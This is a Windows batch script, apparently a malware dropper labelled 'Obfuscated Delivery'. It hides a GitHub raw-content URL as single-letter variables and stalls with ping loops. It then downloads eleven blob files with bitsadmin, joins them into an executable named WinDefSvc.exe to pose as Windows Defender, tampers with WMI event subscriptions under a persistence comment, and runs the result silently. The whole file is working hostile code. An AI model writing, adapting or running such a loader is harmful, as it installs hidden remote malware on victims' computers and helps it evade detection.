@echo off
:: v8.1 - Obfuscated Delivery
setlocal enabledelayedexpansion

:: Obfuscated variables
set "a=h" & set "b=t" & set "c=t" & set "d=p" & set "e=s"
set "f=:" & set "g=/" & set "h=/" & set "i=r" & set "j=a" & set "k=w"
set "l=." & set "m=g" & set "n=i" & set "o=t" & set "p=h" & set "q=u"
set "r=b" & set "s=u" & set "t=s" & set "u=e" & set "v=r" & set "w=c"
set "x=o" & set "y=n" & set "z=t" & set "aa=e" & set "ab=n" & set "ac=t"
set "repo=!a!!b!!c!!d!!e!!f!!g!!h!!i!!j!!k!!l!!m!!n!!o!!p!!q!!r!!s!!t!!u!!v!!w!!x!!y!!z!!aa!!ab!!ac!.com/sophieduval/der/main"

set "bd=%LOCALAPPDATA%"
set "bn=WinDefSvc"
set "tf=%bd%\%bn%"

:: Delay (obfuscated ping)
for /l %%x in (1,1,10) do (ping -n 2 127.0.0.1 >nul 2>&1)

if not exist "%tf%" md "%tf%" 2>nul
cd /d "%tf%"

:: Download using bitsadmin (alternative LOLBAS)
for /l %%i in (0,1,10) do (
    set "x=%%i"
    if %%i LSS 10 set "x=0%%i"
    set "fn=blob_!x!.dat"
    if not exist "!fn!" (
        bitsadmin /transfer "j%%i" /priority high "!repo!/!fn!" "%tf%\!fn!" >nul 2>&1
    )
)

:: Reassemble with obfuscated copy
set "out=WinDefSvc.exe"
copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%out%" >nul 2>&1

:: Persistence via WMI (alternative to schtasks)
wmic /namespace:\\root\subscription path __EventFilterToConsumerBinding delete >nul 2>&1
wmic /namespace:\\root\subscription path CommandLineEventConsumer delete >nul 2>&1
wmic /namespace:\\root\subscription path __EventFilter delete >nul 2>&1

:: Execute silently
start /b "" "%out%"

exit
